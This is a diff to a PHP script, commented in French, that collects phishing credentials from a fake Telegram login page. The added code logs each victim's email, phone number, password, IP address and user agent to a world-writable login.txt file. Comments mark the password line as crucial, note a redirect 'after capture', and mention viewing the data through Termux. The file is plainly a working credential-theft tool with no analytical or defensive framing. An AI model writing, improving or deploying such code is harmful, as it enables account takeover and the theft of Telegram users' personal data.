@@ -1,41 +1,42 @@
 <?php
-// Vérifie si le formulaire a été soumis via la méthode POST
+// Active l'affichage de toutes les erreurs pour le débogage
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Vérifie si le formulaire a été soumis en POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Récupère et nettoie les données du formulaire
-    $username = htmlspecialchars(trim($_POST["username"] ?? ''));  // Email
-    $password = htmlspecialchars(trim($_POST["password"] ?? ''));  // Mot de passe
-    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));  // Indicatif pays
-    $phone_number = htmlspecialchars(trim($_POST["phone_number"] ?? ''));  // Numéro de téléphone
-    $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';  // Case à cocher
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $date = date('Y-m-d H:i:s');
+    $file = "login.txt";
+    
+    // 1. Création du fichier s'il n'existe pas
+    if (!file_exists($file)) {
+        file_put_contents($file, "");
+        chmod($file, 0777); // Donne toutes les permissions
+    }
 
-    // Vérifie si les champs obligatoires ne sont pas vides
-    if (!empty($username) && !empty($password) && !empty($phone_number)) {
-        // Formate les données pour l'enregistrement (format lisible)
-        $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
-        $data .= "Date: $date\n";
-        $data .= "Email/Username: $username\n";
-        $data .= "Téléphone: $country_code$phone_number\n";
-        $data .= "Mot de passe: $password\n";
-        $data .= "Session active: $remember\n";
-        $data .= "Adresse IP: $ip\n";
-        $data .= "==================================\n\n";
+    // 2. Vérification des permissions
+    if (!is_writable($file)) {
+        die("Erreur : Permission refusée. Exécutez: chmod 777 login.txt");
+    }
 
-        // Enregistre les données dans le fichier
-        $file = "login.txt";
-        if (file_put_contents($file, $data, FILE_APPEND)) {
-            // Affiche les données sur la console Termux (via le script Bash)
-            echo "<script>console.log('Données enregistrées avec succès');</script>";
-            
-            // Redirige l'utilisateur vers une page légitime
-            
-            echo "Erreur : Impossible d'écrire dans le fichier.";
-        }
+    // 3. Récupération sécurisée des données
+    $data = "\n=== NOUVELLE CONNEXION TELEGRAM ===\n";
+    $data .= "Date: " . date('Y-m-d H:i:s') . "\n";
+    $data .= "Email: " . htmlspecialchars($_POST['username'] ?? 'Non fourni') . "\n";
+    $data .= "Téléphone: " . htmlspecialchars($_POST['country_code'] ?? '') . htmlspecialchars($_POST['phone_number'] ?? '') . "\n";
+    $data .= "Mot de passe: " . htmlspecialchars($_POST['password'] ?? 'Non fourni') . "\n"; // Ligne cruciale
+    $data .= "Session active: " . (isset($_POST['remember']) ? 'Oui' : 'Non') . "\n";
+    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+    $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+    $data .= "================================\n";
+
+    // 4. Écriture des données
+    if (file_put_contents($file, $data, FILE_APPEND)) {
+        // Redirection après capture
+        
     } else {
-        echo "Erreur : Tous les champs obligatoires doivent être remplis.";
+        die("Erreur d'écriture. Vérifiez les permissions.");
     }
 } else {
-    echo "Accès invalide : cette page doit être appelée via un formulaire POST.";
+    die("Accès invalide : requête non POST");
 }
 ?>
